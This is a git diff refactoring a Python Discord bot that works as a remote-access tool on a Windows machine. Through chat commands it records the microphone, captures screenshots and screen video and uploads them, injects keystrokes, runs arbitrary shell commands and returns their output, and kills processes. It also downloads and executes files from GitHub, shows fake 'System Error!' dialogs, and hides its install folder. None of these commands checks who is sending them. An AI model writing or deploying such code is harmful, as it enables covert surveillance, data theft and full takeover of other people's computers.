@@ -1,59 +1,48 @@
-import numpy as np
-import pyaudio
-import wave
-from PIL import ImageGrab, Image, ImageTk
-import os 
+import os
 import discord
 import asyncio
 import requests
-import imageio
 import pyautogui
-from gtts import gTTS 
+from gtts import gTTS
 import pygame
 import time
 from threading import Thread
+from tkvideo import tkvideo
 import tkinter as tk
 from tkinter import messagebox
-from dotenv import load_dotenv 
-import cv2
+from dotenv import load_dotenv
 from urllib.request import urlretrieve
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL
 import ctypes
-from dotenv import load_dotenv
-import dotenv
 import shutil
+import subprocess
+import wave
 
 
+from PIL import ImageGrab, Image, ImageTk
 
-token = os.getenv('Ethan')  # Replace with your token
-
-# Try loading from the current working directory first
-loaded = dotenv.load_dotenv()
-print(f"dotenv loaded (from current dir): {loaded}")
-if not loaded:
-    # If not found, try loading from the C:\announcer directory explicitly
-    loaded = dotenv.load_dotenv(dotenv_path='C:\\announcer\\.env')
-    print(f"dotenv loaded (from C:\\announcer): {loaded}")
-
-token = os.getenv("Ethan")  # Replace with your token
+# Load token from .env
+load_dotenv()
+token = os.getenv("Ethan")
+if not token:
+    load_dotenv(dotenv_path='C:\\announcer\\.env')
+    token = os.getenv("Ethan")
 print(f"Token value: {token}")
 
 timeout = 1
-connection = False
-async def wifi_check():
-    try:
-        requests.head("https://discord.com", timeout=timeout)
-        # Connection Success
-        print('The internet connection is active')
-        connection = True
-    except requests.ConnectionError:
-        # Connection Retry
-        print("The internet connection is down")
-        connection = False
-        time.sleep(1)
-        await wifi_check()
 
+async def wifi_check():
+    while True:
+        try:
+            requests.head("https://discord.com", timeout=timeout)
+            print('The internet connection is active')
+            break
+        except requests.ConnectionError:
+            print("The internet connection is down, retrying...")
+            await asyncio.sleep(1)
+
+# Run wifi check before starting the bot
 asyncio.run(wifi_check())
 
 class MyClient(discord.Client):
@@ -64,52 +53,42 @@ class MyClient(discord.Client):
         print("Bot reconnected to Discord.")
 
     async def on_ready(self):
-        #announce logon
-        print(f'Logged on as {self.user}!') ,
-        #custom status
-        await client.change_presence(activity=discord.Game(name="Started!"))
-        time.sleep(3)
-        #go back to online status
-        await client.change_presence(activity=discord.Game(name="Online"))
+        print(f'Logged on as {self.user}!')
+        await self.change_presence(activity=discord.Game(name="Started!"))
+        await asyncio.sleep(3)
+        await self.change_presence(activity=discord.Game(name="Online"))
+
     async def on_message(self, message):
         try:
-            # Ask Discord user which mic to use and send a mic list then record a 30 second audio clip through specified mic and send it into the Discord
-            if f'{message.content}' == 'rec':
+            # rec - Record audio
+            if message.content == 'rec':
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
 
-                # Initialize pyaudio
+                import pyaudio
                 p = pyaudio.PyAudio()
-
-                # List available devices
                 device_list = []
                 for i in range(p.get_device_count()):
                     info = p.get_device_info_by_index(i)
                     device_list.append(f"{i}: {info.get('name')}")
-
                 device_list_str = "\n".join(device_list)
-
-                # Write the device list to a file
                 with open('device_list.txt', 'w') as f:
                     f.write(device_list_str)
-
-                # Send the device list file to Discord
                 await message.channel.send(file=discord.File('device_list.txt'))
                 os.remove('device_list.txt')
 
                 await message.channel.send('Please enter the device index of the mic you would like to use')
-                msg = await client.wait_for('message', check=check)
+                msg = await self.wait_for('message', check=check)
                 device_index = int(msg.content)
 
                 await message.channel.send('How long would you like to record (in seconds)?')
-                msg = await client.wait_for('message', check=check)
+                msg = await self.wait_for('message', check=check)
                 record_seconds = int(msg.content)
 
-                # Set up the stream
-                chunk = 1024  # Record in chunks of 1024 samples
-                sample_format = pyaudio.paInt32  # 16 bits per sample
+                chunk = 1024
+                sample_format = pyaudio.paInt32
                 channels = 1
-                rate = 44100  # Record at 44100 samples per second
+                rate = 44100
 
                 stream = p.open(format=sample_format,
                                 channels=channels,
@@ -119,20 +98,15 @@ class MyClient(discord.Client):
                                 frames_per_buffer=chunk)
 
                 await message.channel.send(f'Recording for {record_seconds} seconds...')
-                record_seconds = record_seconds + 1
-                frames = []  # Initialize array to store frames
-
-                # Store data in chunks for the specified duration
+                frames = []
                 for _ in range(0, int(rate / chunk * record_seconds)):
                     data = stream.read(chunk)
                     frames.append(data)
 
-                # Stop and close the stream
                 stream.stop_stream()
                 stream.close()
                 p.terminate()
 
-                # Save the recorded data as a WAV file
                 wf = wave.open('output.wav', 'wb')
                 wf.setnchannels(channels)
                 wf.setsampwidth(p.get_sample_size(sample_format))
@@ -142,201 +116,165 @@ class MyClient(discord.Client):
 
                 await message.channel.send(file=discord.File('output.wav'))
                 os.remove('output.wav')
-            #update the application   
-            if f'{message.content}' == 'upd':
+
+            # upd - Update the application
+            if message.content == 'upd':
                 url = "https://github.com/Plexisity/announcer/raw/main/update.exe"
                 filename = "download.exe"
-                #stop the update process if it is running
                 os.system("taskkill /f /im update.exe")
-                #download the file
-                file = urlretrieve(url, filename)
-                # Check if the file already exists
+                urlretrieve(url, filename)
                 if os.path.exists("update.exe"):
                     print("File already exists. Deleting it...")
                     await message.channel.send('"File already exists. Deleting it...')
                     os.remove("update.exe")
-
                 os.replace("download.exe", r".\update.exe")
                 os.startfile(r".\update.exe")
                 await message.channel.send('Updating...')
-                await client.change_presence(activity=discord.Game(name="Updating..."))
-            #take a screenshot
-            if f'{message.content}' == 'scr':
-                # Take screenshot
-                #repeat a user defined amount
+                await self.change_presence(activity=discord.Game(name="Updating..."))
+
+            # scr - Take a screenshot
+            if message.content == 'scr':
                 await message.channel.send('Please enter the amount of screenshots you would like to take')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
-                msg = await client.wait_for('message', check=check)
+                msg = await self.wait_for('message', check=check)
                 amount = int(msg.content)
                 for i in range(amount):
                     im = ImageGrab.grab()
                     im.save('screenshot.png')
                     await message.channel.send(file=discord.File('screenshot.png'))
                     os.remove('screenshot.png')
-                    time.sleep(1)
-            #text to speech
-            if f'{message.content}' == 'tts':
-                # Check if the message is from the bot itself
+                    await asyncio.sleep(1)
+
+            # tts - Text-to-speech
+            if message.content == 'tts':
                 if message.author == self.user:
-                    return 
-                # Wait for reply containing the user defined message in discord
+                    return
                 await message.channel.send('Please enter the message you would like to send')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
-                msg = await client.wait_for('message', check=check)      
-
+                msg = await self.wait_for('message', check=check)
                 async def Playsound():
-                    # Play the notification and message contents
                     message_content = (msg.content)
-                    player = gTTS(text=message_content, lang='en', slow=False) 
+                    player = gTTS(text=message_content, lang='en', slow=False)
                     player.save("msg.mp3")
                     pygame.mixer.init()
                     pygame.mixer.music.load("msg.mp3")
                     pygame.mixer.music.play()
                     while pygame.mixer.music.get_busy():
                         await asyncio.sleep(0.1)
-                    pygame.mixer.music.unload()  # Unload the music to release the file
+                    pygame.mixer.music.unload()
                     os.remove("msg.mp3")
-
                 await Playsound()
-            #display a message box
-            if f'{message.content}' == 'msg':  
-                #wait for reply containing the user defined message in discord
+
+            # msg - Display a message box
+            if message.content == 'msg':
                 await message.channel.send('Please enter the message you would like to send')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
-                msg = await client.wait_for('message', check=check)
+                msg = await self.wait_for('message', check=check)
                 if msg.content == 'cancel':
                     await message.channel.send('Message sending cancelled')
                     return
-                else:
-                    def Dialog_Box():
-                        message_content = (msg.content)
-                        root = tk.Tk()
-                        root.withdraw()  # Hide the root window
-                        root.attributes('-topmost', True)  # Always on top
-                        messagebox.showinfo("System Error!", message_content)
-                        root.destroy()
-                        #open dialog box
-                        t2 = Thread(target=Dialog_Box)
-                        t2.start()
-                        t2.join()
-            #lock the screen
-            if f'{message.content}' == 'lock': 
-                # Lock the screen
+                def Dialog_Box():
+                    message_content = (msg.content)
+                    root = tk.Tk()
+                    root.withdraw()
+                    root.attributes('-topmost', True)
+                    messagebox.showinfo("System Error!", message_content)
+                    root.destroy()
+                t2 = Thread(target=Dialog_Box)
+                t2.start()
+                t2.join()
+
+            # lock - Lock the screen
+            if message.content == 'lock':
                 os.system("rundll32.exe user32.dll,LockWorkStation")
                 await message.channel.send('Screen Locked')
-            #send keystrokes
-            if f'{message.content}' == 'key':
+
+            # key - Send keystrokes
+            if message.content == 'key':
                 await message.channel.send('Please enter the keystrokes you would like to send')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
-                msg = await client.wait_for('message', check=check)
+                msg = await self.wait_for('message', check=check)
                 pyautogui.typewrite(msg.content)
                 await message.channel.send('Keystrokes sent')
-            #close a process
-            if f'{message.content}' == 'close':
-                #send a list of proccesses to discord chat
+
+            # close - Close a process
+            if message.content == 'close':
                 os.system('tasklist > tasklist.txt')
                 await message.channel.send(file=discord.File('tasklist.txt'))
                 os.remove('tasklist.txt')
                 await message.channel.send('Please enter the process you would like to close')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
-                msg = await client.wait_for('message', check=check)
+                msg = await self.wait_for('message', check=check)
                 await message.channel.send(f'Closing {msg.content}')
                 os.system(f'taskkill /f /im {msg.content}')
-            #show an image for half a second on screen
-            if f'{message.content}' == 'img':
-                 await message.channel.send('Please upload the image you would like to display')
-                 def check(m):
-                     return m.author == message.author and m.channel == message.channel and m.attachments
-                 msg = await client.wait_for('message', check=check)
-                 attachment = msg.attachments[0]
-                 await attachment.save('temp_image.png')
 
-                 def show_image():
-                     print("Creating tkinter window")
-                     root = tk.Tk()
-                     root.attributes('-topmost', True)  # Always on top
-                     img = Image.open('temp_image.png')
-                     img = ImageTk.PhotoImage(img)
-                     panel = tk.Label(root, image=img)
-                     panel.pack(side="top", fill="both", expand="yes")
-                     root.after(500, lambda: root.destroy())  # Close the window after 500 milliseconds
-                     print("Displaying image")
-                     root.mainloop()
-                     print("Image displayed and window closed")
+            # img - Show an image for half a second
+            if message.content == 'img':
+                await message.channel.send('Please upload the image you would like to display')
+                def check(m):
+                    return m.author == message.author and m.channel == message.channel and m.attachments
+                msg = await self.wait_for('message', check=check)
+                attachment = msg.attachments[0]
+                await attachment.save('temp_image.png')
+                def show_image():
+                    root = tk.Tk()
+                    root.attributes('-topmost', True)
+                    img = Image.open('temp_image.png')
+                    img = ImageTk.PhotoImage(img)
+                    panel = tk.Label(root, image=img)
+                    panel.pack(side="top", fill="both", expand="yes")
+                    root.after(500, lambda: root.destroy())
+                    root.mainloop()
+                show_image()
+                os.remove('temp_image.png')
 
-                 print("Calling show_image()")
-                 show_image()
-                 print("Image should have been displayed")
-                 os.remove('temp_image.png')
-            #play a vid on screen with no audio   
-            if f'{message.content}' == 'vid':
+            # vid - Play a video (no audio)
+            if message.content == 'vid':
                 await message.channel.send('Please upload the video you would like to display')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel and m.attachments
-                msg = await client.wait_for('message', check=check)
+                msg = await self.wait_for('message', check=check)
                 attachment = msg.attachments[0]
                 await attachment.save('temp_video.mp4')
-
-                def show_video():
-                    print("Creating tkinter window")
+                # play video in tkinter window using tkvideo
+                def play_video():
                     root = tk.Tk()
-                    root.attributes('-topmost', True)  # Always on top
-                    video_label = tk.Label(root)
-                    video_label.pack(side="top", fill="both", expand="yes")
-
-                    def stream_video():
-                        video = cv2.VideoCapture('temp_video.mp4')
-
-                        while video.isOpened():
-                            ret, frame = video.read()
-                            if not ret:
-                                break
-                            img = ImageTk.PhotoImage(Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)))
-                            video_label.config(image=img)
-                            video_label.image = img
-                            root.update_idletasks()
-                            time.sleep(1 / video.get(cv2.CAP_PROP_FPS))
-
-                        video.release()
-
-                    Thread(target=stream_video).start()
+                    root.attributes('-topmost', True)
+                    label = tk.Label(root)
+                    label.pack()
+                    player = tkvideo("temp_video.mp4", label, loop=0, size=(640, 480))
+                    player.play()
                     root.mainloop()
-                    print("Video displayed and window closed")
-
-                print("Calling show_video()")
-                show_video()
-                print("Video should have been displayed")
-                
+                t1 = Thread(target=play_video)
+                t1.start()
+                t1.join()
                 os.remove('temp_video.mp4')
-            #play a user defined sound on host machine
-            if f'{message.content}' == 'sound':
+
+            # sound - Play a user defined sound
+            if message.content == 'sound':
                 await message.channel.send('Please upload the sound you would like to play')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel and m.attachments
-                msg = await client.wait_for('message', check=check)
+                msg = await self.wait_for('message', check=check)
                 attachment = msg.attachments[0]
                 await attachment.save('temp_sound.mp3')
-
                 async def play_sound():
                     pygame.mixer.init()
                     pygame.mixer.music.load('temp_sound.mp3')
                     pygame.mixer.music.play()
                     while pygame.mixer.music.get_busy():
                         await asyncio.sleep(0.1)
-                    pygame.mixer.music.unload()  # Unload the music to release the file
+                    pygame.mixer.music.unload()
                     os.remove('temp_sound.mp3')
-
                 await play_sound()
-            #change volume
-            if f'{message.content}' == 'vol':
-                #unmute volume if it is muted
-                #An error occurred: local variable 'volume_interface' referenced before assignment
-                volume_interface = None
+
+            # vol - Change volume
+            if message.content == 'vol':
                 devices = AudioUtilities.GetSpeakers()
                 interface = devices.Activate(
                     IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -347,21 +285,16 @@ class MyClient(discord.Client):
                 await message.channel.send('Please enter the volume you would like to set (0-100)')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
-                msg = await client.wait_for('message', check=check)
-                volume = float(msg.content) / 100.0  # Convert to a value between 0.0 and 1.0
+                msg = await self.wait_for('message', check=check)
                 if msg.content == 'cancel':
                     await message.channel.send('Volume change cancelled')
                     return
-                else:
-                    devices = AudioUtilities.GetSpeakers()
-                    interface = devices.Activate(
-                        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-                    volume_interface = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
-                    volume_interface.SetMasterVolumeLevelScalar(volume, None)
-                    await message.channel.send(f'Volume set to {msg.content}%')
-                    return
-            #display a user defined message
-            if f'{message.content}' == 'help':
+                volume = float(msg.content) / 100.0
+                volume_interface.SetMasterVolumeLevelScalar(volume, None)
+                await message.channel.send(f'Volume set to {msg.content}%')
+
+            # help - Display help message
+            if message.content == 'help':
                 help_message = (
                     "Available commands:\n"
                     "rec - Record audio\n"
@@ -385,84 +318,99 @@ class MyClient(discord.Client):
                     "help - Show this help message\n"
                 )
                 await message.channel.send(help_message)
-            #press win + d
-            if f'{message.content}' == 'min':
+
+            # min - Press Win+D
+            if message.content == 'min':
                 pyautogui.hotkey('win', 'd')
                 await message.channel.send('Minimized all windows')
-            #record a video of the screen
-            if f'{message.content}' == 'scrvid':
+
+            # scrvid - Record a video of the screen using ffmpeg
+            if message.content == 'scrvid':
                 await message.channel.send('Please enter the duration of the video you would like to record (in seconds)')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
-                msg = await client.wait_for('message', check=check)
+                msg = await self.wait_for('message', check=check)
                 duration = int(msg.content)
-
                 await message.channel.send('Recording video...')
-
-
-                fps = 60
-                writer = imageio.get_writer('output.mp4', fps=fps, codec='libx264', quality=10)
-
-                # Record the screen
+                fps = 10
+                frame_folder = "frames"
+                os.makedirs(frame_folder, exist_ok=True)
                 start_time = time.time()
+                frame_count = 0
                 while time.time() - start_time < duration:
                     screenshot = pyautogui.screenshot()
-                    writer.append_data(imageio.core.util.Array(np.array(screenshot)))
-                    time.sleep(1 / (fps * 5))
+                    frame_path = os.path.join(frame_folder, f"frame_{frame_count:05d}.png")
+                    screenshot.save(frame_path)
+                    frame_count += 1
+                    await asyncio.sleep(1 / fps)
+                await message.channel.send('Encoding video with ffmpeg...')
+                ffmpeg_path = os.path.join(os.getcwd(), "ffmpeg.exe")
+                output_video = "output.mp4"
+                input_pattern = os.path.join(frame_folder, "frame_%05d.png")
+                cmd = [
+                    ffmpeg_path,
+                    "-y",
+                    "-framerate", str(fps),
+                    "-i", input_pattern,
+                    "-c:v", "libx264",
+                    "-pix_fmt", "yuv420p",
+                    output_video
+                ]
+                result = subprocess.run(cmd, capture_output=True, text=True)
+                print(result.stdout)
+                print(result.stderr)
+                if os.path.exists(output_video):
+                    await message.channel.send(file=discord.File(output_video))
+                    os.remove(output_video)
+                else:
+                    await message.channel.send("Failed to create video.")
+                for f in os.listdir(frame_folder):
+                    os.remove(os.path.join(frame_folder, f))
+                os.rmdir(frame_folder)
 
-                writer.close()
-
-                await message.channel.send(file=discord.File('output.mp4'))
-                os.remove('output.mp4')
-            #run a console command
-            if f'{message.content}' == 'cmd':
+            # cmd - Run a console command
+            if message.content == 'cmd':
                 await message.channel.send('Please enter the command you would like to run')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel
-                msg = await client.wait_for('message', check=check)
-                if not msg.content == 'cancel':
-                    os.system(msg.content)
-                else:
+                msg = await self.wait_for('message', check=check)
+                if msg.content == 'cancel':
                     await message.channel.send('Command cancelled')
-                await message.channel.send(f'Command "{msg.content}" executed')
-                #output command prompt output if there is one
-                output = os.popen(msg.content).read()
-                if output:
-                    await message.channel.send(f'Command output:\n{output}')
+                else:
+                    try:
+                        output = os.popen(msg.content).read()
+                        await message.channel.send(f'Command \"{msg.content}\" executed')
+                        if output:
+                            for i in range(0, len(output), 1900):
+                                await message.channel.send(f'Command output:\n{output[i:i+1900]}')
+                    except Exception as e:
+                        await message.channel.send(f'An error occurred: {str(e)}')
+
+            # selfdestruct - Self-destruct the application
+            if message.content == 'selfdestruct':
+                os.system('taskkill /f /im index.exe')
+                await message.channel.send('Self-destruct sequence initiated')
+                await message.channel.send('goodbye...')
+                url = "https://github.com/Plexisity/announcer/raw/main/delete.exe"
+                filename = "delete.exe"
+                urlretrieve(url, filename)
+                shutil.move("delete.exe", os.path.expandvars(r"%appdata%\delete.exe"))
+                os.system(f'%appdata%\\delete.exe')
+                await self.change_presence(activity=discord.Game(name="Self-destructing..."))
+                await self.close()
+
+            # hide - Hide the announcer folder
+            if message.content == 'hide':
+                os.system('attrib +h C:\\announcer')
+                await message.channel.send('Folder hidden')
+
+            # unhide - Unhide the announcer folder
+            if message.content == 'unhide':
+                os.system('attrib -h C:\\announcer')
+                await message.channel.send('Folder unhidden')
+
         except Exception as e:
-            await message.channel.send(f'An error occurred: {str(e)}')
-            
-        if f'{message.content}' == 'selfdestruct':
-            os.system('taskkill /f /im index.exe')
-            await message.channel.send('Self-destruct sequence initiated')
-            await message.channel.send('goodbye...')
-            #download delete script and place it into appdata
-            url = "https://github.com/Plexisity/announcer/raw/main/delete.exe"
-            filename = "delete.exe"
-            file = urlretrieve(url, filename)
-            #move into appdata folder
-            
-            shutil.move("delete.exe", os.path.expandvars(r"%appdata%\delete.exe"))
-            
-            #run the delete script
-            os.system(f'%appdata%\\delete.exe')
-
-            await client.change_presence(activity=discord.Game(name="Self-destructing..."))
-            #exit the program
-            await client.close()
-        
-        if f'{message.content}' == 'hide':
-            # Make the announcer folder hidden
-            os.system('attrib +h C:\\announcer')
-            await message.channel.send('Folder hidden')
-        if f'{message.content}' == 'unhide':
-            # Make the announcer folder visible
-            os.system('attrib -h C:\\announcer')
-            await message.channel.send('Folder unhidden')
-
-
-        
-        
+            await message.channel.send(f"An error occurred: {e}")
 
 intents = discord.Intents.default()
 intents.message_content = True
